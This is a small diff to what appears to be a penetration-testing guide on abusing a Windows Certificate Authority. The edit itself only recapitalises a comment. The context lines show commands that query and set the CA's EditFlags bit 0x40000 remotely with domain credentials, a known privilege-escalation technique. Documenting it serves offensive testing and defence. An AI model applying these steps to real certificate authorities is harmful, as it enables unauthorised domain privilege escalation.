@@ -126,7 +126,7 @@ If sufficient rights are obtained over the Certificate Authority (Access Control
 # query flags
 reg.py 'DOMAIN'/'USER':'PASSWORD'@'CA_IP' query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags
 
-# bitwise or to set the flag if not already (nothing changed if already set)
+# bitwise OR to set the flag if not already (nothing changed if already set)
 python3 -c print("NEW_VALUE:", VALUE | 0x40000)
 
 # write flags
